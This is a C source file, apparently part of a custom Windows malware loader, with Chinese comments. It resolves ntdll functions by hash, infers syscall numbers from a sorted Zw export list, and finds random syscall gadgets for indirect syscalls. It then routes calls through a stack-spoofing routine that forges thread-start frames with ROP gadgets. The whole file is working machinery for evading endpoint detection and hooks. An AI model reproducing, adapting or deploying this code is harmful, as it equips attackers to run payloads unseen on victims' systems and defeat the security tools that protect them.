#include "myloader.h"

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	if (!g_SyscallList.Count) SW3_PopulateSyscallList(pModuleBase);

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;
			DWORD syscallId = SW3_GetSyscallNumber((DWORD)pVxTableEntry->dwHash);
			if (syscallId != (DWORD)-1)
				pVxTableEntry->wSystemCall = (WORD)syscallId;

			pVxTableEntry->pSyscallInst = SW3_GetRandomSyscallAddress((DWORD)pVxTableEntry->dwHash);
			if (!pVxTableEntry->pSyscallInst)
				pVxTableEntry->pSyscallInst = GetSyscallGadget(pModuleBase);

			if (!pVxTableEntry->wSystemCall) {
				WORD cw = 0;
				while (cw < 32) {
					if (*((PBYTE)pFunctionAddress + cw) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {

						BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
						pVxTableEntry->wSystemCall = (high << 8) | low;
						break;
					}
					cw++;
				}
				
			}
			if (!pVxTableEntry->wSystemCall) {
                //WARN("Failed to extract Syscall ID for hash: 0x%llX", pVxTableEntry->dwHash);
                return FALSE; 
            }
			pVxTableEntry->pGadget_Clean = g_pStackGadget;
			pVxTableEntry->pGadget_Thunk = g_pThunkGadget;
			return TRUE;
		}
	}
	return FALSE;
}

NTSTATUS InvokeSpoofedSyscall(PVX_TABLE_ENTRY pEntry, UINT64 argCount, ...) {
    if (!pEntry || !pEntry->pSyscallInst) return STATUS_INVALID_PARAMETER;

    Gate(pEntry->wSystemCall, pEntry->pSyscallInst, pEntry->pGadget_Clean, pEntry->pGadget_Thunk);

    SPOOFER spoof = { 0 };
    spoof.SpoofFunctionPointer = SyscallWrapper;
    spoof.Nargs = argCount;
    spoof.ReturnAddress = _AddressOfReturnAddress();

    spoof.KernelBaseAddress = g_ntdllBase;
    spoof.KernelBaseAddressEnd = (PVOID)((ULONG_PTR)g_ntdllBase + 0x400000); // rough upper bound

    spoof.RtlUserThreadStartAddress = g_pRtlUserThreadStart;
    spoof.BaseThreadInitThunkAddress = g_pBaseThreadInitThunk;
    spoof.RtlUserThreadStartFrameSize = g_RtlFrameSize;
    spoof.BaseThreadInitThunkFrameSize = g_BaseFrameSize;

    spoof.FirstFrameFunctionPointer = g_pRtlUserThreadStart;
    spoof.SecondFrameFunctionPointer = g_pBaseThreadInitThunk;
    spoof.FirstFrameSize = g_RtlFrameSize;
    spoof.SecondFrameSize = g_BaseFrameSize;
    spoof.FirstFrameRandomOffset =(DWORD64)g_FirstFrameOffset;
    spoof.SecondFrameRandomOffset =(DWORD64)g_SecondFrameOffset;

    spoof.JmpRbxGadget = g_pThunkGadget ? g_pThunkGadget : g_pRandomSyscallGadget;
    spoof.AddRspXGadget = g_pStackGadget ? g_pStackGadget : g_pRandomSyscallGadget;
    // JmpRbxGadget 通常是 jmp [rbx] 或 call [rbx]，本身不涉及栈调整
    spoof.JmpRbxGadgetFrameSize = g_JmpRbxGadgetFrameSize; 
    
    if (spoof.AddRspXGadget == g_pStackGadget) {
        spoof.AddRspXGadgetFrameSize = g_StackGadgetSize+0x8;
    } else {
        spoof.AddRspXGadgetFrameSize = 0; // Fallback 情况
    };

    va_list args;
    va_start(args, argCount);
    for (UINT64 idx = 0; idx < argCount && idx < 12; idx++) {
        ULONG_PTR v = va_arg(args, ULONG_PTR);
        switch (idx) {
        case 0: spoof.Arg01 = (PVOID)v; break;
        case 1: spoof.Arg02 = (PVOID)v; break;
        case 2: spoof.Arg03 = (PVOID)v; break;
        case 3: spoof.Arg04 = (PVOID)v; break;
        case 4: spoof.Arg05 = (PVOID)v; break;
        case 5: spoof.Arg06 = (PVOID)v; break;
        case 6: spoof.Arg07 = (PVOID)v; break;
        case 7: spoof.Arg08 = (PVOID)v; break;
        case 8: spoof.Arg09 = (PVOID)v; break;
        case 9: spoof.Arg10 = (PVOID)v; break;
        case 10: spoof.Arg11 = (PVOID)v; break;
        case 11: spoof.Arg12 = (PVOID)v; break;
        default: break;
        }
    }
    va_end(args);

    return (NTSTATUS)(ULONG_PTR)SpoofCall(&spoof);
}

DWORD SW3_HashSyscall(PCSTR FunctionName) {
	DWORD i = 0;
	DWORD Hash = SW3_SEED;

	while (FunctionName[i]) {
		WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
		Hash ^= PartialName + SW3_ROR8(Hash);
	}

	return Hash;
}

PVOID SC_Address(PVOID NtApiAddress) {
	DWORD searchLimit = 512;
	PVOID SyscallAddress;
	// 64bit only here
	BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
	ULONG distance_to_syscall = 0x12;

	SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);
	if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		return SyscallAddress;

	for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++) {
		SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall + num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
			return SyscallAddress;

		SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall - num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
			return SyscallAddress;
	}
	return NULL;
}

BOOL SW3_PopulateSyscallList(PVOID ntdllBase) {
    if (g_SyscallList.Count) return TRUE;
    if (!ntdllBase) return FALSE;

    // 1. 获取头部信息并计算模块范围 (用于防越界)
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + DosHeader->e_lfanew);
    DWORD ImageSize = NtHeaders->OptionalHeader.SizeOfImage;
    ULONG_PTR ImageEnd = (ULONG_PTR)ntdllBase + ImageSize;

    PIMAGE_DATA_DIRECTORY DataDirectory = &NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    DWORD VirtualAddress = DataDirectory->VirtualAddress;
    if (!VirtualAddress) return FALSE;

    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + VirtualAddress);
    
    // 2. 验证导出表指针是否合法
    if (!IS_ADDR_SAFE(ExportDirectory, ntdllBase, ImageSize)) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    DWORD NumberOfFunctions = ExportDirectory->NumberOfFunctions; // 用于校验 Ordinal

    if (NumberOfNames == 0 || NumberOfNames > 0xFFFF) return FALSE; 

    PDWORD Functions = SW3_RVA2VA(PDWORD, ntdllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW3_RVA2VA(PDWORD, ntdllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW3_RVA2VA(PWORD, ntdllBase, ExportDirectory->AddressOfNameOrdinals);

    // 验证表指针是否合法
    if (!IS_ADDR_SAFE(Functions, ntdllBase, ImageSize) || 
        !IS_ADDR_SAFE(Names, ntdllBase, ImageSize) || 
        !IS_ADDR_SAFE(Ordinals, ntdllBase, ImageSize)) {
        return FALSE;
    }

    DWORD i = 0;
    PSW3_SYSCALL_ENTRY Entries = g_SyscallList.Entries;

    // 3. 循环解析 (使用 for 循环)
    for (DWORD j = 0; j < NumberOfNames; j++) {
        // [防御] 使用 SEH 捕获内存违规，防止单点故障导致全崩
        __try {
            // [防御] 检查 Names[j] 是否越界
            if (!IS_ADDR_SAFE(&Names[j], ntdllBase, ImageSize)) continue;

            PCHAR FunctionName = SW3_RVA2VA(PCHAR, ntdllBase, Names[j]);
            
            // [防御] 检查字符串指针是否合法
            if (!IS_ADDR_SAFE(FunctionName, ntdllBase, ImageSize)) continue;

            // 查找 "Zw" (0x775a)
            if (*(USHORT*)FunctionName == 0x775a) {
                // [防御] 检查 Ordinal 索引是否越界 (关键崩溃源之一)
                // Ordinals[j] 返回的是 AddressOfFunctions 的索引
                WORD funcIndex = Ordinals[j];
                if (funcIndex >= NumberOfFunctions) continue;

                // 计算函数地址
                DWORD funcRVA = Functions[funcIndex];
                PVOID funcAddr = SW3_RVA2VA(PVOID, ntdllBase, funcRVA);

                // [防御] 检查函数地址是否合法
                if (!IS_ADDR_SAFE(funcAddr, ntdllBase, ImageSize)) continue;

                Entries[i].Hash = SW3_HashSyscall(FunctionName);
                Entries[i].Address = funcRVA;
                
                // SC_Address 内部会扫描内存，如果扫到页边界可能会崩
                // 但因为我们在 __try 块里，所以就算崩了也会被捕获并跳过
                Entries[i].SyscallAddress = SC_Address(funcAddr);

                i++;
                if (i == SW3_MAX_ENTRIES) break;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // 捕获到异常 (0xC0000005)，静默跳过当前出错的函数，继续下一个
             continue;
        }
    }

    g_SyscallList.Count = i;

    // 4. 排序 (仅当数量 > 1)
    if (g_SyscallList.Count > 1) {
        for (DWORD x = 0; x < g_SyscallList.Count - 1; x++) {
            for (DWORD y = 0; y < g_SyscallList.Count - x - 1; y++) {
                if (Entries[y].Address > Entries[y + 1].Address) {
                    SW3_SYSCALL_ENTRY TempEntry = Entries[y];
                    Entries[y] = Entries[y + 1];
                    Entries[y + 1] = TempEntry;
                }
            }
        }
    }

    return TRUE;
}

DWORD SW3_GetSyscallNumber(DWORD FunctionHash) {
	if (!g_SyscallList.Count) return (DWORD)-1;
	for (DWORD i = 0; i < g_SyscallList.Count; i++) {
		if (FunctionHash == g_SyscallList.Entries[i].Hash)
			return i;
	}
	return (DWORD)-1;
}

PVOID SW3_GetSyscallAddress(DWORD FunctionHash) {
	if (!g_SyscallList.Count) return NULL;
	for (DWORD i = 0; i < g_SyscallList.Count; i++) {
		if (FunctionHash == g_SyscallList.Entries[i].Hash)
			return g_SyscallList.Entries[i].SyscallAddress;
	}
	return NULL;
}

PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash) {
	if (!g_SyscallList.Count) return NULL;
	DWORD index = ((DWORD)rand()) % g_SyscallList.Count;
	while (FunctionHash == g_SyscallList.Entries[index].Hash) {
		index = ((DWORD)rand()) % g_SyscallList.Count;
	}
	return g_SyscallList.Entries[index].SyscallAddress;
}


